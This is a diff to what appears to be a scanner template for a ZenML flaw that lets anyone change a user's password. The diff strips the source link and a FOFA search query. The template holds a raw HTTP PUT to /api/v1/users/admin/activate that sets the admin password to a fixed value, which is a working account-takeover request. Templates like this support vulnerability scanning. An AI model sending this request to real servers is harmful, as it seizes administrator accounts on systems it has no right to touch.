@@ -3,20 +3,14 @@ info:
   name: ZenML 任意用户密码修改漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xx8qowvf7818n3b2'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xx8qowvf7818n3b2
-    fofa: title=="ZenML - Dashboard"
 http:
 - raw:
   - 'PUT /api/v1/users/admin/activate HTTP/1.1
 
 
     Content-Type: application/json
-
-
 
 
     {"password": "dudesite@123"}
